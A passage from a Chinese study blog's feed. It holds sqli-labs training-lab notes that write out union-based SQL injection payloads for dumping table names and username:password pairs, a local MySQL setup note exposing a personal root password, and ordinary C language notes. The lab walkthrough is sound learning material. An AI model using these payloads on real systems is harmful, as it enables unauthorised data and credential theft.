    <summary type="html">&lt;h1 id=&quot;lesson5&quot;&gt;&lt;a href=&quot;#lesson5&quot; class=&quot;headerlink&quot; title=&quot;lesson5&quot;&gt;&lt;/a&gt;lesson5&lt;/h1&gt;&lt;h2 id=&quot;A-sql布尔盲注&quot;&gt;&lt;a href=&quot;#A-sql布尔盲注&quot; class=&quot;header</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson2，lesson3，lesson4</title>
    <link href="http://example.com/2020/11/16/blog%20d/"/>
    <id>http://example.com/2020/11/16/blog%20d/</id>
    <published>2020-11-16T14:04:05.000Z</published>
    <updated>2021-01-30T14:48:16.341Z</updated>
    
    <content type="html"><![CDATA[<h4 id="一-找注入点"><a href="#一-找注入点" class="headerlink" title="一.找注入点"></a>一.找注入点</h4><p>由题目提示：注入点为整数。</p><p>试探：输入?id=1返回正常；输入?id=0返回异常；且输入?id=0 or 1=1–+得到的返回值正确。故该处存在sql注入点。</p><p>二.判断字段数</p><p>输入?id=1 order by n–+直到输入n=4时返回错误。故数据库中存在3个字段。</p><p>三.爆开数据库：得到数据库名</p><p>输入?id=0 uion select 1,2,database()–+语句</p><p>四.爆开数据表：得到数据表名</p><p>输入?id=0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() –+语句。</p><p>注：table_schema=database()赋值语句，即列出数据库中的表名</p><p>五.爆开数据列：得到数据列名</p><p>输入?id=0 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ –+语句</p><p>六.爆开数据值</p><p>输入?id=0 union select 1,group_concat(username,0x3a,password),3 from users–+语句。</p><p>七.总结：lesson1—4的爆库方法基本一致，只有在注入点上略有不同。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;一-找注入点&quot;&gt;&lt;a href=&quot;#一-找注入点&quot; class=&quot;headerlink&quot; title=&quot;一.找注入点&quot;&gt;&lt;/a&gt;一.找注入点&lt;/h4&gt;&lt;p&gt;由题目提示：注入点为整数。&lt;/p&gt;
&lt;p&gt;试探：输入?id=1返回正常；输入?id=0返回异常；且输入?id</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson1</title>
    <link href="http://example.com/2020/11/14/blog%20c/"/>
    <id>http://example.com/2020/11/14/blog%20c/</id>
    <published>2020-11-14T13:07:05.000Z</published>
    <updated>2021-04-01T10:36:28.342Z</updated>
    
    <content type="html"><![CDATA[<p>前言：这是第二次写lesson1的blog，万事开头难。</p><p>一.寻找sql注入点</p><p>根据标题提示该sql注入点为单引号。输入?id=1’返回值错误；输入?id=1返回值正常。故存在注入点。</p><p>注：1.（自己的摸索）：发现输入id=非正整数如（?id=-1）时，页面返回为空。这是因为这些数值不在数据库范围之内，故返回为空。</p><p>2.不是所有引起报错的点都是注入点，也可能是由于单纯的语法错误导致了页面报错。而当存在一个真正的注入点时，输入?id=0+注入点+or 1=1–+语句返回值正常，反之报错。</p><p>二.查询字段数</p><p>利用order by语句。?id=1%27%20order%20by%20<em>n</em>–+（n为正整数，不断改变n的值通过观察返回状态确定字段数）如：</p><p>输入?id=1%27%20order%20by%201–+，返回正常。</p><p>输入?id=1%27%20order%20by%204–+，返回异常。</p><p>当输入到第n-1个正常，第n个不正常时，说明拥有n-1个字段数。</p><p>注：字段数就是sql数据库中存在变量数的个数。</p><p>三.union select看返回值</p><p>1.利用union select语句查看字段数返回值。?id=-1%27union%20select%201,2,3–+。</p><p>只有2,3代表的回显位能被观察到，即用户从浏览器上反馈看见的只有2,3回显位。</p><p>2.利用union select语句查看数据库返回值。</p><p>输入?id=-1%27union%20select%201,database(),2–+.</p><p>由此可知：database的名称为security。</p><p>注意使用union select</p><p>四.查表</p><p>1.输入?id=-1’ union select 1 ,2,group_concat(table_name) from information_schema.tables where table_schema=‘sercurity’–+即可查获在sercurity数据库中的表单名。</p><p>注：对于理解该代码：group_concat(table_name) ：group_concat函数是典型的字符串连接函数；from information_schema.tables：来自信息图表数据库中的表单。where table_schema=‘sercurity’其中where为限制词，where table_schema=‘sercurity’:寻找范围在数据库名为sercurity中。</p><p>ps:为了方便在页面上看到自己在url里输入的内容可以在index文件里加一句<code>echo &quot; $sql&lt; br &gt;&quot;</code>;</p><p>五.查字段名以及字段数值</p><p>1.输入?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database()–+可查得字段名。</p><p>2.输入?id=-1’union select 1,2,group_concat(username,0x3a,password) from users–+可查得每个用户对应的密码（0x3a是字符冒号，：’对应16进制的ASCLL码）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前言：这是第二次写lesson1的blog，万事开头难。&lt;/p&gt;
&lt;p&gt;一.寻找sql注入点&lt;/p&gt;
&lt;p&gt;根据标题提示该sql注入点为单引号。输入?id=1’返回值错误；输入?id=1返回值正常。故存在注入点。&lt;/p&gt;
&lt;p&gt;注：1.（自己的摸索）：发现输入id=非正整数</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>sql注入基本知识lesson1</title>
    <link href="http://example.com/2020/11/10/blog%20b/"/>
    <id>http://example.com/2020/11/10/blog%20b/</id>
    <published>2020-11-10T13:00:12.000Z</published>
    <updated>2021-01-31T04:39:16.108Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一-判断是否存在sql注入的方法"><a href="#一-判断是否存在sql注入的方法" class="headerlink" title="一.判断是否存在sql注入的方法"></a>一.判断是否存在sql注入的方法</h3><h4 id="1-基础中的基础：get单引号判断"><a href="#1-基础中的基础：get单引号判断" class="headerlink" title="1.基础中的基础：get单引号判断"></a>1.基础中的基础：get单引号判断</h4><p>在地址栏网址后加**?id=1<strong>，显示正常；加</strong>?id=1’<strong>，显示错误。则说明存在sql注入点。且</strong>‘**的url编码是%27.</p><h4 id="2-get-and判断"><a href="#2-get-and判断" class="headerlink" title="2.get and判断"></a>2.get and判断</h4><p>输入<code>?id=-1 and 1=1</code>    正常；</p><p>输入<code>?id=-1&#39;and 1=2</code>    报错；存在sql。</p><p>总结：在请求字符串或id参数后加<strong>’</strong>，是一种基本检测是否存在sql注入的方法。</p><h4 id="3-Or、xor判断"><a href="#3-Or、xor判断" class="headerlink" title="3.Or、xor判断"></a>3.Or、xor判断</h4><p>同get and判断</p><h4 id="4-sql运算符判断"><a href="#4-sql运算符判断" class="headerlink" title="4.sql运算符判断"></a>4.sql运算符判断</h4><h4 id="5-通过sleep函数演示显示的形式进行判断"><a href="#5-通过sleep函数演示显示的形式进行判断" class="headerlink" title="5.通过sleep函数演示显示的形式进行判断"></a>5.通过sleep函数演示显示的形式进行判断</h4><h4 id="6-服务端返回错误形式"><a href="#6-服务端返回错误形式" class="headerlink" title="6.服务端返回错误形式"></a>6.服务端返回错误形式</h4><h4 id="7-了解post、get、编码"><a href="#7-了解post、get、编码" class="headerlink" title="7.了解post、get、编码"></a>7.了解post、get、编码</h4><p><code>#</code> 是sql语句中的注释符；</p><p><code>+</code> 在http请求中表示空格；</p><p><code>--</code> 后面的语句相当于被注释掉,不执行后面的sql语句；</p><p><code>--+</code>代表闭合sql查询语句，如果没加，无法形成有效的mysql语句。</p><p>在post参数中，要加空格符时，直接输入空格符即可；用+会被http请求转义为%23编码；</p><p>在get请求中，如果想使用空格，需要用空格符编码<code>%20</code>来替代，不然会请求报错；如果使用#，则#后面的参数不会提交到服务器，但如果使用编码%23即可提交到服务器。</p><h5 id="常见的url编码："><a href="#常见的url编码：" class="headerlink" title="常见的url编码："></a>常见的url编码：</h5><p>空格 ：<code>%20</code> ；           + ：%2B；          &lt; ：%3C；            &gt; ：%3E         ‘ :   %27         #： %23</p><h4 id="8-sql注入常用函数"><a href="#8-sql注入常用函数" class="headerlink" title="8.sql注入常用函数"></a>8.sql注入常用函数</h4><p>1.order by：该函数对结果集进行排序，用于猜测字段数。例如输入?id=1’ order by 3 –+显示正常；输入?id=1’ order by 4 –+显示错误。故得出在?id=1查看的表有3个字段</p><h4 id="二-确认字段数"><a href="#二-确认字段数" class="headerlink" title="二.确认字段数"></a>二.确认字段数</h4><p>确认字段数可以使用order by语句，例如：?id=1’ order by 4 %23 时报错!</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;一-判断是否存在sql注入的方法&quot;&gt;&lt;a href=&quot;#一-判断是否存在sql注入的方法&quot; class=&quot;headerlink&quot; title=&quot;一.判断是否存在sql注入的方法&quot;&gt;&lt;/a&gt;一.判断是否存在sql注入的方法&lt;/h3&gt;&lt;h4 id=&quot;1-基础中的基础：</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>MYSQL</title>
    <link href="http://example.com/2020/11/09/MYSQL%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <id>http://example.com/2020/11/09/MYSQL%E6%95%B0%E6%8D%AE%E5%BA%93/</id>
    <published>2020-11-09T13:29:45.000Z</published>
    <updated>2021-01-31T12:05:38.730Z</updated>
    
    <content type="html"><![CDATA[<p>1.MYSQL注入在线靶场<a href="https://www.anquanlong.com/lab_detail?lab_id=3&amp;lib=1">https://www.anquanlong.com/lab_detail?lab_id=3&amp;lib=1</a></p><p>   个人用phpstudy搭建本地靶场。</p><p>2.更改root密码时应该同时修改网址的根目录下对应文件中的密码。如sql-connections文件中。</p><h4 id="MYSQL数据库的使用"><a href="#MYSQL数据库的使用" class="headerlink" title="MYSQL数据库的使用"></a>MYSQL数据库的使用</h4><p>1.在D:\phpstudy_pro\Extensions\MySQL5.7.26\bin目录下打开，输入语句./mysql.exe -uroot -p；</p><p>2.跳出语句让你输入密码（lcj20020425）；</p><p>3.输入查询语句，语句以；结尾。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.MYSQL注入在线靶场&lt;a href=&quot;https://www.anquanlong.com/lab_detail?lab_id=3&amp;amp;lib=1&quot;&gt;https://www.anquanlong.com/lab_detail?lab_id=3&amp;amp;lib=1&lt;</summary>
      
    
    
    
    
    <category term="MySQL数据库的搭建与启动" scheme="http://example.com/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/"/>
    
  </entry>
  
  <entry>
    <title>第五章汇总（1）</title>
    <link href="http://example.com/2020/11/09/blog7/"/>
    <id>http://example.com/2020/11/09/blog7/</id>
    <published>2020-11-09T11:00:22.000Z</published>
    <updated>2021-01-30T14:54:28.738Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h4 id="一-函数"><a href="#一-函数" class="headerlink" title="一.函数"></a>一.函数</h4><p>1.系统运行C语言程序时，从主函数开始计算，当遇到自定义函数时，转到自定义函数进行运算，最后回到主函数完成运算。</p><p>2.非主函数的其他函数之间可以相互调用。一个函数调用另一个函数，前者称为主调函数，后者称为被调函数。</p><p>3.<strong>函数的定义：</strong></p><p>类型标识符 函数名（）</p><p>{</p><p>​     函数体</p><p>}</p><p>4.类型标识符的作用是定义函数体执行完之后，函数返回值的类型。若省略类型标识符，系统默认函数返回值类型为int型。如果函数无返回值，则用void来定义函数的返回值。</p><p>5.函数体一般用return语句来结束，格式如return （表达式）。当程序执行到return语句时，先计算表达式的值，然后程序的流程返回到调用该函数的地方，并将表达式的值作为函数值返回给主调函数。</p><p>6.<strong>函数的参数传递。</strong>a.函数间值传递时，形参的值在被调函数中会改变，而实参的值保持不变。（根本原因是这两者的数据地址不同）</p><p>​                                  b.实参的作用是把函数中的具体数值传递给被调用的函数。且实参个数与顺序要和形参相同，实参和形参对应的数据类型也相同。</p><p>具体使用如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"> void swap(char x,char y)&#x2F;&#x2F;x,y为形参</span><br><span class="line"> &#123;</span><br><span class="line"> char ch;</span><br><span class="line"> ch&#x3D;x;</span><br><span class="line"> x&#x3D;y;</span><br><span class="line"> y&#x3D;ch;</span><br><span class="line"> &#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">char ch1&#x3D;&#39;a&#39;,ch2&#x3D;&#39;b&#39;;</span><br><span class="line">printf(&quot;before:ch1&#x3D;%c ch2&#x3D;%c\n&quot;,ch1,ch2);</span><br><span class="line">swap(ch1,ch2);&#x2F;&#x2F;此处的ch1，ch2都是实参</span><br><span class="line">printf(&quot;after:ch1&#x3D;%c ch2&#x3D;%c\n&quot;,ch1,ch2);</span><br><span class="line">return 0;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><p>输出的结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">before:ch1&#x3D;a ch2&#x3D;b</span><br><span class="line">after:ch1&#x3D;a ch2&#x3D;b</span><br></pre></td></tr></table></figure><h4 id="二-地址传递"><a href="#二-地址传递" class="headerlink" title="二.地址传递"></a>二.地址传递</h4><p><strong>表示地址值的形式有</strong>：<u>数组名</u>（注意是数组名不是数组，如数组a[0]则取不到实参地址），&amp;变量，字符串，指针变量。</p><p>当使用上述方式进行值传递时，可使形参和实参的地址相同。则当形参的值发生改变时，实参的值也随之发生改变，即数据具有双向性。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">double efunn(double a[2]);</span><br><span class="line">double b[2],average;</span><br><span class="line">b[0]&#x3D;15.6;</span><br><span class="line">b[1]&#x3D;b[0]&#x2F;2;</span><br><span class="line">printf(&quot;1--in main:b[0]&#x3D;%3.1f b[1]&#x3D;%3.1f\n&quot;,b[0],b[1]);</span><br><span class="line">average&#x3D;efunn(b);&#x2F;&#x2F;b为数组名</span><br><span class="line">printf(&quot;average&#x3D;%3.1f\n&quot;,average);</span><br><span class="line">printf(&quot;3--in main:b[0]&#x3D;%3.1f b[1]&#x3D;%3.1f\n&quot;,b[0],b[1]);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">    double efunn(double a[2])&#x2F;&#x2F;形参数组可不用定义元素个数，但使用形参数组时要注意不能超过实参数组个数，否则会报错。</span><br><span class="line">&#123;</span><br><span class="line">double sum,aver;</span><br><span class="line">sum&#x3D;a[0]+a[1];</span><br><span class="line">a[0]&#x3D;a[0]+2.5;</span><br><span class="line">a[1]&#x3D;a[1]+5.8;</span><br><span class="line">aver&#x3D;sum&#x2F;2;</span><br><span class="line">printf(&quot;2-in function:a[0]&#x3D;%3.1f a[1]&#x3D;%3.1f\n&quot;,a[0],a[1]);</span><br><span class="line">return (aver);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1--in main:b[0]&#x3D;15.6 b[1]&#x3D;7.8</span><br><span class="line">2-in function:a[0]&#x3D;18.1 a[1]&#x3D;13.6</span><br><span class="line">average&#x3D;11.7</span><br><span class="line">3--in main:b[0]&#x3D;18.1 b[1]&#x3D;13.6</span><br></pre></td></tr></table></figure><p><strong>二维数组与一维数组的关系：</strong></p><p>a[m] [n] =a[i*n+j]，具体为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (i&#x3D;0;i&lt;m;i++)</span><br><span class="line">    for (j&#x3D;0;j&lt;n;j++)</span><br><span class="line">a[i*n+j]</span><br></pre></td></tr></table></figure><h4 id="三-变量"><a href="#三-变量" class="headerlink" title="三.变量"></a>三.变量</h4><p>1.局部变量：在一个复合语句当中定义的一个变量；全局变量：在函数外部定义的变量，也称为外部变量。当全局变量与局部变量重名时，局部变量有效，而全局变量失效。</p><p>2.动态变量：auto| auto int a=1 相当于int a=1 ；</p><p>   静态变量：static|用类型变量在被调用后不会清除，其值会被保留；</p><p>   寄存器变量：register</p><h5 id="关键词extern"><a href="#关键词extern" class="headerlink" title="关键词extern:"></a>关键词extern:</h5><p>当外部变量不在文件开头定义时，则仅限于定义处到文件结束范围之内使用该变量，若要在作用域范围之外使用全局变量，则可以使用extern关键词来声明外部变量。</p><h4 id="四-宏定义"><a href="#四-宏定义" class="headerlink" title="四.宏定义"></a>四.宏定义</h4><p>1.宏定义是指将一个标识符（又称为宏名）定义为一个字符串。在执行代码时，所有宏名的值都为该字符串。</p><p>2.宏定义不是c程序语言，不必在句尾加封号，且要在函数代码块外声明定义。</p><p>3.被双引号括起来的标识符（变量名）即使与宏名一样，也不会被宏定义替换。</p><p>4.使用带参宏定义时要注意，宏定义不会对形参进行计算，这就要注意形参参与加减乘除时的整体性，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#define square1(x) x*x</span><br><span class="line">int square (int x)</span><br><span class="line">&#123;   return (x*x);</span><br><span class="line"> &#125; </span><br><span class="line"> int main()</span><br><span class="line"> &#123;</span><br><span class="line"> int m&#x3D;10;</span><br><span class="line"> printf(&quot;10的平方为:%d&#x3D;%d\n&quot;,square(10),square1(10));</span><br><span class="line"> printf(&quot;11的平方为:%d!&#x3D;%d\n&quot;,square(10+1),square1(10+1));</span><br><span class="line"> printf(&quot;11的平方为:%d!&#x3D;%d\n&quot;,square(++m),square1(++m));</span><br><span class="line"> return 0;</span><br><span class="line">  &#125; </span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10的平方为:100&#x3D;100</span><br><span class="line">11的平方为:121!&#x3D;21</span><br><span class="line">11的平方为:169!&#x3D;144</span><br></pre></td></tr></table></figure><p>5.宏定义时，字符串可以是任何类型的数据。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h4 id=&quot;一-函数&quot;&gt;&lt;a href=&quot;#一-函数&quot; class=&quot;headerlink&quot; title=&quot;一.函数&quot;&gt;&lt;/a&gt;一.函数&lt;/h4&gt;&lt;p&gt;1.系统运行C语言程序时，从主函数开始计算，当遇到自定义函数时，转到自定义函数进行运算，最后回到主</summary>
      
    
    
    
    
    <category term="C语言学习" scheme="http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>第四章汇总（3）</title>
    <link href="http://example.com/2020/11/01/blog6/"/>
    <id>http://example.com/2020/11/01/blog6/</id>
    <published>2020-11-01T01:37:48.000Z</published>
    <updated>2021-01-30T14:54:11.902Z</updated>
    
    <content type="html"><![CDATA[<p>一.结构体</p><p>1.成员的类型可以是另一个结构体的类型，如：存在struct  a  b，即意味b是struct  a型。</p><p>2.如果两个结构体的成员类型，名称，个数相同，但结构体名不同，也是两个不同的结构类型。</p><p>3.成员名可以和程序中的变量名相同，二者不代表同一对象。如：程序中可以定义“int num”，同时还可以在struct结构中定义”int num“。</p><p>4.初值内容用“{}”括起来，各组数据用“，”隔开，并且数据应与结构体类型定义时的成员个数相等，类型一致。</p><p>5.如果初值个数少于结构体成员个数，则自动为无初值的成员赋值0；若多余则编译错误。</p><p>二.新的关键词</p><p>1.const是C语言中的一个关键词，他限定一个变量不允许被改变。使用const在一定程度上提高程序的安全性和可靠性。</p><p>2.enum是枚举类型的引导字，用于声明枚举类型。</p><p>3.typedef用于声明一种新类型名来代替旧类型名。</p><p>三.共用体</p><p>1.共用体类型是一种多个不同类型共享储蓄空间的构造类型，即共用体变量的所有成员占同一个储蓄空间。</p><p>2.共用体变量所占空间的大小取决于占储蓄空间最大的成员，而不是各个成员的储蓄空间之和，这点是与结构体变量有着本质上的不同。</p><p>3.对共用体的某一成员赋值，会覆盖其他成员原来的数据，原来成员的值就不存在了，因此，共用体变量中起作用的是最后一次存入的成员变量的值。例如：</p><p>x.a=10;x.b=20;printf(“%d%f”,x.a,x.b);       输出结果为：0  20.0</p><p>四.枚举类型</p><p>1.enum 语法格式：</p><p>   enum  枚举名</p><p>   {     枚举值1[=整型常数1]，枚举值2[=整型常数2]….   }；</p><p>2.括号内的“=整型常数”可以省略。如果省略，编译程序按照顺序给每个枚举元素一个对应的整数值，整数值从0开始，后续元素顺序加1.</p><p>3.在C语言中，枚举变量的值不能直接进行输入和输出，只能间接地实现输出和输入的操作。例如使用switch（）语句。</p><p>4.不能把枚举常量对应的序号直接赋值给枚举变量。如枚举变量=1。</p><p>5.可以用强制类型转换为枚举变量赋值，如：枚举变量=（enum 枚举名）（1）。</p><p>五.自定义类型名</p><p>1.语法格式：typedef  类型名 新类型名</p><p>2.特别的，用typedef语法定义数组类型名，如：typedef int appay[10]//定义appay为有十个元素的整型数组类型名。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一.结构体&lt;/p&gt;
&lt;p&gt;1.成员的类型可以是另一个结构体的类型，如：存在struct  a  b，即意味b是struct  a型。&lt;/p&gt;
&lt;p&gt;2.如果两个结构体的成员类型，名称，个数相同，但结构体名不同，也是两个不同的结构类型。&lt;/p&gt;
&lt;p&gt;3.成员名可以和程序中的</summary>
      
    
    
    
    
    <category term="C语言学习" scheme="http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>第四章汇总（2）</title>
    <link href="http://example.com/2020/10/31/blog5/"/>
    <id>http://example.com/2020/10/31/blog5/</id>
    <published>2020-10-31T12:00:08.000Z</published>
    <updated>2021-01-30T14:53:54.758Z</updated>
    
    <content type="html"><![CDATA[<p>一.字符数组</p><p>1.若不对字符数组进行初始化，则数组中各元素的值是不可预知的。</p><p>2.若花括号内提供的字符数组个数多余数组长度，则会产生编译错误的信息。</p><p>3.若花括号内提供的字符数组个数少余数组长度，则编译器将这些字符优先赋值给前面的元素，其余元素取值（’\0’）。</p><p>4.用字符串常量直接赋值时，可省略花括号，用“”覆盖字符串常量。用字符常量逐个赋初值，时花括号不可省略，且各个字符由’’覆盖，字符间用逗号隔开。</p><p>5.C语言中，字符串是以字符’\0’结尾，故它会额外占据数组一格内存。</p><p>6.使用%c格式说明符进行逐个字符的输入/输出；使用%s格式说明符进行字符串的输入/输出。</p><p>7.当一个字符表示为字符串变量名时，其本身就是该字符串的首地址，即scanf（）函数输入时无需再使加取地址符“&amp;”。</p><p>8.使用字符串函数时要在程序开头用“#include&lt;string.h&gt;”命令将头文件&lt;string.h&gt;包括进来。</p><p>9.引用字符要用“ ‘’ ”。</p><p>二.新函数</p><p>a 字符串复制函数strcpy（）； 用法：若strcpy（字符数组1，字符数组2），将字符串1/字符数组2连同结束标志’\0’复制到字符数组1中。</p><p>b 字符串连续函数strcat（） ；用法：若strcpy（字符数组1，字符数组2），链接两个字符串，把字符串2连接到字符串1后面，再把得到的结果放在字符串1中。</p><p>c  字符串比较函数strcmp（） ； 用法：若strcmp（字符串1，字符串2）</p><p>d 求字符串长度strlen（）；用法：若strlen（字符串），检测字符串中字符的个数，不包括’\0’。</p><p>e 大写字母转换小写字母函数strlwr（）。</p><p>f 小写字母换号大写字母函数strupr（）。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一.字符数组&lt;/p&gt;
&lt;p&gt;1.若不对字符数组进行初始化，则数组中各元素的值是不可预知的。&lt;/p&gt;
&lt;p&gt;2.若花括号内提供的字符数组个数多余数组长度，则会产生编译错误的信息。&lt;/p&gt;
&lt;p&gt;3.若花括号内提供的字符数组个数少余数组长度，则编译器将这些字符优先赋值给前面的元</summary>
      
    
    
    
    
    <category term="C语言学习" scheme="http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>第四章汇总（1）</title>
    <link href="http://example.com/2020/10/22/blog4/"/>
    <id>http://example.com/2020/10/22/blog4/</id>
    <published>2020-10-22T13:19:02.000Z</published>
    <updated>2021-01-30T14:53:34.438Z</updated>
    
    <content type="html"><![CDATA[<p>一.   一维数组</p><p>1.a 数组名不能与变量名一样；b 可以在定义变量名的同时定义数组；</p><p>​            c  “[]”中的数据只能是整型常量，不能是变量，且若为整型常量即可在其中加减；</p><p>​            d  数组下标是从0开始的，且数组最后一个元素的下标为该数组元素个数减一；</p><p>​            e  C语言中只能逐个使用数组中的元素，不能一次性引用多个元素，如：a[2]=1，意为将1的值赋值给该数组的第二个元素；</p><p>​            f  若未给数组中元素赋值，则其输出结果为不确定值；</p><p>​            g 当所赋初值个数多余该数组的元素个数时，在编译时出错，无结果；当所赋初值个数少于该数组的元素个数时，会自动给未赋值的元素赋值为0。</p><ol start="2"><li><p>a 产生随机数：利用rand()函数，其原型为int rand(void)。要产生[n,m]范围内随机整数，要利用公式(int)(n+(m-n)*rand()/RAND_MAX)</p><p>b  初始化随机数发生器：srand()，其函数原型为void srand(unsigned int seed)。seed是随机数种子，为了产生不可预见的随机数，通常用time(0)返回的值作为随机种子。而函数time(0)包含在头文件&lt;time.h&gt;中。</p></li></ol><p>二.   二维数组</p><ol><li>初始化二维数组时，可省略第一维的长度，但第二维长度不能忽略。</li><li>按顺序赋值并且省略第一维的长度时，数组第一维的大小按以下规则决定。设有n个初值数据，第二维长度为m，由于可能只对部分数据赋值，n/m不一定会被整除，因此第一维的大小通常为(int)(n/m+1).</li><li>矩阵转置：将一个二维数组的行和列元素进行互换。即将二维数组a中的第i行第j列元素赋给二位数组b中的第j行第i列。</li></ol><p>三.字符串函数</p><p>strcmp(字符串1,字符串2)</p><p>用法：两个字符串自左向右一个个比对，直到出现不同的字符或遇到‘\0’为止。（若字符串第一个字符比对就不同，那么即停止比对）。函数的返回值——a.若字符串1=字符串2，那么返回值为0；b.若字符串1&gt;字符串2，那么返回值为正整数；c.若字符串1&lt;字符串2，那么返回值为负整数。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一.   一维数组&lt;/p&gt;
&lt;p&gt;1.a 数组名不能与变量名一样；b 可以在定义变量名的同时定义数组；&lt;/p&gt;
&lt;p&gt;​            c  “[]”中的数据只能是整型常量，不能是变量，且若为整型常量即可在其中加减；&lt;/p&gt;
&lt;p&gt;​            d  数</summary>
      
    
    
    
    
    <category term="C语言学习" scheme="http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>第三章汇总</title>
    <link href="http://example.com/2020/10/18/blog3/"/>
    <id>http://example.com/2020/10/18/blog3/</id>
    <published>2020-10-18T08:15:25.000Z</published>
    <updated>2021-01-30T14:53:10.262Z</updated>
    
    <content type="html"><![CDATA[<p>1.if语句：只有当表达式成立时才会执行该if后的语句，且if与跟随语句之间无”;”隔开。</p><p>2.if-else语句:当存在多个if-else语句时，最近的if-else两两配对。</p><p>3.swich语句:a.switch()括号内的整型表达式也可以是字符型变量的表达式。</p><p>​                      b.当执行完某个语句组后遇到break，则跳出此switch结构，执行下一代码指令。</p><p>4.while语句:先进行条件判断，再执行循环语句。</p><p>while语句的一个小妙用，例如：(当a自减到0时即会停止循环)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int a&#x3D;3;</span><br><span class="line">while(a) a--;</span><br></pre></td></tr></table></figure><p>5.do-while语句:先执行循环语句，在进行条件判断。当遇到单独属于do-while结构中的break时会跳出do-while语句。</p><p>6.for语句:执行for(表达式1;表达式2;表达式3;)时，先执行表达式1和2，再执行循环体，最后执行表达式3。以此循环。</p><p>7.else-if语句：从表达式一开始计算，当遇到表达式n成立时，跳出该if镶嵌语句。</p><p>8.continue语句：结束本次循环，即不再执行continue后的代码，转入下一次循环的判断和执行。（但不会跳出该循环）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.if语句：只有当表达式成立时才会执行该if后的语句，且if与跟随语句之间无”;”隔开。&lt;/p&gt;
&lt;p&gt;2.if-else语句:当存在多个if-else语句时，最近的if-else两两配对。&lt;/p&gt;
&lt;p&gt;3.swich语句:a.switch()括号内的整型表达式也可以是</summary>
      
    
    
    
    
